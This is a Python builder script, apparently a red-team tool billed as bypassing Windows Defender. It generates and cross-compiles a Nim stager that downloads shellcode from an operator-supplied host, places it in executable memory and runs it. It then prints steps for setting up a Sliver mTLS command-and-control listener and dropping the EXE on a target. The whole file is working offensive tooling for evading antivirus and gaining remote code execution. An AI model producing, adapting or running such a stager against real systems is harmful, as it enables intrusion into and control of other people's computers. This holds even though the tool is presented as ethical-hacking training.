#!/usr/bin/env python3

import argparse
import os
import shutil
import subprocess
import sys

NIM_TEMPLATE = r'''
import winim/lean
import httpclient, httpcore, os

let LOG = getTempDir() / "stager.log"

proc log(msg: string) =
  try:
    var f = open(LOG, fmAppend)
    f.writeLine(msg)
    f.close()
  except CatchableError:
    discard

func toByteSeq(s: string): seq[byte] {{.inline.}} =
  @(s.toOpenArrayByte(0, s.high))

proc DownloadExecute(url: string): void =
  log("--- start url=" & url)

  var client = newHttpClient(timeout = 15000)
  client.headers = newHttpHeaders(
    {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}})

  var response: string
  try:
    response = client.getContent(url)
  except CatchableError as e:
    log("DOWNLOAD FAILED: " & e.msg)
    return

  log("downloaded " & $response.len & " bytes")
  if response.len < 1024:
    log("too small - probably an HTML error page")
    return

  var shellcode: seq[byte] = toByteSeq(response)

  let rPtr = VirtualAlloc(NULL, cast[SIZE_T](len(shellcode)),
                          MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
  log("VirtualAlloc -> 0x" & $cast[uint](rPtr))
  if rPtr == nil:
    log("VirtualAlloc FAILED")
    return

  copyMem(rPtr, unsafeAddr shellcode[0], len(shellcode))
  log("jumping to shellcode")

  let f = cast[proc() {{.nimcall.}}](rPtr)
  f()

  log("shellcode RETURNED - holding process alive")
  while true: Sleep(1000)

when defined(windows):
  when isMainModule:
    DownloadExecute("http://{{ip}}:{{stage_port}}/shellc.bin")
'''

# Dependency binary -> per-package-manager package name
DEPS = {
    "x86_64-w64-mingw32-gcc": {
        "apt": "mingw-w64",
        "dnf": "mingw64-gcc",
        "pacman": "mingw-w64-gcc",
        "brew": "mingw-w64",
    },
    "nim": {
        "apt": "nim",
        "dnf": "nim",
        "pacman": "nim",
        "brew": "nim",
    },
}


def port_type(value):
    """argparse type that validates a TCP port number."""
    try:
        port = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError(f"{value!r} is not an integer")
    if not 1 <= port <= 65535:
        raise argparse.ArgumentTypeError(f"{port} is outside the range 1-65535")
    return port


def run_cmd(cmd, description):
    """Run a shell command, aborting the build on failure."""
    print(f"[*] {description}...")
    print(f"    $ {cmd}")
    try:
        subprocess.run(cmd, shell=True, check=True)
    except subprocess.CalledProcessError:
        print(f"[!] Error during: {description}")
        sys.exit(1)


def pkg_manager():
    for manager in ("apt", "dnf", "pacman", "brew"):
        if shutil.which(manager):
            return manager
    return None


def install_cmd(manager, package):
    if manager == "apt":
        return f"sudo apt update && sudo apt install -y {package}"
    if manager == "dnf":
        return f"sudo dnf install -y {package}"
    if manager == "pacman":
        return f"sudo pacman -S --noconfirm {package}"
    if manager == "brew":
        return f"brew install {package}"
    return None


def check_dependencies():
    """Ensure the cross-compiler and Nim are present, installing if needed."""
    manager = pkg_manager()

    for bin_name, packages in DEPS.items():
        if shutil.which(bin_name):
            print(f"[+] {bin_name} is already installed.")
            continue
        print(f"[!] {bin_name} not found.")
        if manager is None:
            print(f"    No known package manager found - install {bin_name} manually.")
            sys.exit(1)

        run_cmd(install_cmd(manager, packages[manager]), f"Installing {bin_name}")


def main():
    help_text = (
        "Bypass Defender Automagically\n"
        "Author: Tyler Ramsbey\n"
        "Learn ethical hacking @ hacksmarter.org"
    )

    parser = argparse.ArgumentParser(
        description=help_text,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument("-l", "--ip", required=True,
                        help="Listener IP/hostname the target can reach")
    parser.add_argument("-p", "--port", required=True, type=port_type,
                        help="Sliver mTLS C2 port")
    parser.add_argument("-s", "--stage-port", type=port_type, default=8000,
                        help="HTTP staging port for shellc.bin "
                             "(must differ from --port, default: 8000)")
    parser.add_argument("--gui", action="store_true",
                        help="Build with no console window (--app:gui)")
    args = parser.parse_args()

    if args.stage_port == args.port:
        print(f"[!] --port and --stage-port are both {args.port}.")
        print("    The mTLS listener and the HTTP server cannot share a port.")
        sys.exit(1)

    print(f"[*] C2 (mTLS): {args.ip}:{args.port}")
    print(f"[*] Staging (HTTP): http://{args.ip}:{args.stage_port}/shellc.bin")

    # 1. Toolchain
    check_dependencies()
    run_cmd("nimble install -y winim", "Installing winim library")

    # 2. Render the Nim source
    print(f"[*] Writing stager.nim...")
    try:
        source = NIM_TEMPLATE.format(ip=args.ip, stage_port=args.stage_port)
        with open("stager.nim", "w", newline="\n") as f:
            f.write(source)
    except Exception as e:
        print(f"[!] Failed to render/write stager.nim: {e}")
        sys.exit(1)

    # 3. Drop any stale binary so the success check cannot lie
    if os.path.exists("stager.exe"):
        os.remove("stager.exe")

    # 4. Compile
    parts = [
        "nim c",
        "-d:release",
        "--opt:size",
        "-d:mingw",
        "--os:windows",
        "--cpu:amd64",
        "--cc:gcc",
        "--gcc.exe:x86_64-w64-mingw32-gcc",
        "--gcc.linkerexe:x86_64-w64-mingw32-gcc",
        "--passL:-s",
    ]
    if args.gui:
        parts.append("--app:gui")
    parts.append("stager.nim")

    run_cmd(" ".join(parts), "Compiling stager.nim to Windows EXE")

    # 5. Result + operator reminders
    if not os.path.exists("stager.exe"):
        print("\n[!] Build failed: stager.exe was not produced.")
        sys.exit(1)

    size_kb = os.path.getsize("stager.exe") / 1024
    print("\n" + "=" * 68)
    print(f"[SUCCESS] stager.exe generated ({size_kb:.0f} KB)")
    print("=" * 68)
    print("\n[!] Next steps, in order:\n")
    print("  1) In your Sliver console, start the mTLS listener:")
    print(f"       mtls --lport {args.port}\n")
    print("  2) Generate the shellcode (requires the listener from step 1):")
    print(f"       generate --mtls {args.ip}:{args.port} --os windows "
          f"--arch amd64 --format shellcode --save shellc.bin\n")
    print("  3) Serve the payload on the SEPARATE staging port:")
    print(f"       python3 -m http.server {args.stage_port} --directory .\n")
    print("  4) Drop stager.exe on the target and run it.\n")
    print(f"  Logs land in %TEMP%\\stager.log on the target.")
    print(f"  Make sure both {args.port} and {args.stage_port} are reachable inbound.")
    print("=" * 68 + "\n")


if __name__ == "__main__":
    main()            

